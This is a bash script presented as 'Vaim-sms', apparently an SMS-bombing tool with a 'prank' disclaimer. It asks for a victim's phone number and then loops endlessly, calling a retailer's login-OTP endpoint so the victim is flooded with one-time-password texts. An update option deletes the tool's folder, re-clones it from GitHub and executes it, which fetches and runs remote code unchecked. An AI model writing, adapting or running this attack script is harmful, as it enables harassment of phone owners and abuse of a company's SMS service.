#!/bin/bash

#==========================================================================================================================
#========================================================================================================================== 
# Vaim-sms v1.2
# Please give credit to the original author when using this code.
# If you use it without giving credit, please respect the work of others.
#==========================================================================================================================
#==========================================================================================================================

banner() {
  clear
  printf "\e[1;91m    ____   ____      .__\e[0m\n"
  printf "\e[1;91m    \   \ /   /____  |__| _____      \e[0m\e[1;93m       ______ _____   ______ \e[0m\n"
  printf "\e[1;91m     \   Y   /\__  \ |  |/     \   __\e[0m\e[1;93m____  /  ___//     \ /  ___/ \e[0m\n"
  printf "\e[1;91m      \     /  / __ \|  |  Y Y  \ /__\e[0m\e[1;93m___/  \___ \|  Y Y  \\___ \  \e[0m\n"
  printf "\e[1;91m       \___/  (____  /__|__|_|  /    \e[0m\e[1;93m     /____  >__|_|  /____  > \e[0m\n"
  printf "\e[1;91m                   \/         \/     \e[0m\e[1;93m          \/      \/     \/  \e[0m\n"
  printf "\n"
  printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[1;31m           By Padsala Trushal  \e[0m                            \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
  printf "\n"
  printf "        \e[1;91m Disclaimer: This tool is designed for Prank\n"
  printf "         testing in an authorized simulated cyberattack\n"
  printf "         Attacking targets without prior mutual consent\n"
  printf "         is illegal!\n"
  printf "\n"
}

upload() {
  clear
  printf "[+] PLEASE WAIT, UPDATING THE SCRIPT......................... \n"
  printf "[+] NOTE: IF IT DOESN'T WORK AFTER UPDATING, PLEASE CONTACT ME AT 'Padsalatrushal@gmail.com' \n  \n"
  sleep 7
  clear
  cd
  rm -rf Vaim-sms
  git clone https://github.com/Trushal2004/Vaim-sms
  cd Vaim-sms
  chmod +x *
  clear
  printf "[+] SCRIPT UPDATED. PLEASE WAIT ............. \n"
  sleep 2
  bash Vaim-sms.sh
}

menu() {
  clear
  banner
  printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER VICTIM NUMBER >>> \e[0m\n"
  read -p '---------------> ' num
  printf "\e[1;92m[\e[0m +\e[1;92m ]\e[0m \e[1;93mENTER LOG FILE NAME >>> \e[0m\n"
  read -p '---------------> ' log
  printf "\n"
  printf ">>>\e[1;92m ATTACKING START ON +91$num \e[0m<<<"
  sleep 5
  printf "\n"
  printf "PRESS CLTR+C TO QUIT ............. \n"
  sleep 3
  clear
  opr
}

opr() {
  while true; do
    curl -i -s -k -X $'GET' \
      -H $'Host: express.shop.bigbazaar.com' -H $'Connection: close' -H $'sec-ch-ua: \";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"' -H $'Accept: application/json, text/plain, */*' -H $'sec-ch-ua-mobile: ?0' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36' -H $'Origin: https://shop.bigbazaar.com' -H $'Sec-Fetch-Site: same-site' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Dest: empty' -H $'Referer: https://shop.bigbazaar.com/' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' \
      $'https://express.shop.bigbazaar.com/express/customer/'$num'/loginOtpInitiate' > $log.txt
  done
}

menux() {
  clear
  apt install curl -y
  clear
  banner
  printf "\e[1;92m[\e[0m 1\e[1;92m ]\e[0m>>>\e[1;93m ATTACK ON NUMBER \e[0m\n"
  printf "\e[1;92m[\e[0m 2 \e[1;92m]\e[0m>>>\e[1;93m UPDATE SCRIPT \e[0m\n"
  printf "\e[1;92m[\e[0m 3\e[1;92m ]\e[0m>>>\e[1;93m QUIT \e[0m\n"
  printf "\n"
  read -p '>>> SELECT ANYONE >>> ' options

  if [ "$options" -eq "1" ]; then
    menu
  fi

  if [ "$options" -eq "2" ]; then
    upload
  fi

  if [ "$options" -eq "3" ]; then
    exit
    exit
    exit
  else
    menux
  fi
}

menux
